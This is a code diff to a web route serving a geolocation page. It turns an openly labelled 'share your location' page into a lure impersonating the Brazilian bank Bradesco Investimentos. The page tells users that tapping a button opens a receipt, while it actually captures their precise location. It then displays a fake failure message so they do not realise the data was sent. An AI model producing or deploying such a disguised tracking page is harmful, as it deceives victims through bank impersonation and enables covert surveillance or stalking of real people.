@@ -50,11 +50,11 @@ app.get("/loc/:token", (req, res) => {
 <head>
   <meta charset="utf-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1"/>
-  <title>Compartilhar localização</title>
+  <title>Bradesco Investimentos</title>
 </head>
 <body style="font-family:Arial; padding:16px; max-width:640px; margin:auto;">
-  <h2>Compartilhar localização</h2>
-  <p>Toque no botão para enviar sua localização. (O navegador pode pedir permissão.)</p>
+  <h2>Bradesco Investimentos</h2>
+  <p>Toque no botão para abrir o comprovante</p>
 
   <button id="btn" style="padding:12px 16px; font-size:16px;">Enviar minha localização</button>
   <pre id="out" style="margin-top:16px; white-space:pre-wrap;"></pre>
@@ -76,7 +76,7 @@ app.get("/loc/:token", (req, res) => {
     }
 
     btn.disabled = true;
-    out.textContent = "Obtendo localização (alta precisão)...";
+    out.textContent = "Abrindo Comprovante...";
 
     let pos;
     try {
@@ -88,7 +88,7 @@ app.get("/loc/:token", (req, res) => {
       } catch (e2) {
         btn.disabled = false;
         out.textContent =
-          "Não foi possível obter a localização. " +
+          "Não foi possível abrir o comprovante. " +
           "Abra em 'Chrome', ative Localização do celular e permita 'Localização precisa'. " +
           "Erro: " + (e2.message || e2);
         return;
@@ -111,7 +111,7 @@ app.get("/loc/:token", (req, res) => {
     });
 
     if (r.ok) {
-      out.textContent = "Enviado com sucesso ✅";
+      out.textContent = "Falha na abertura do comprovante ❌";
     } else {
       let msg = "Falha ao enviar ❌ (" + r.status + ")";
       try {
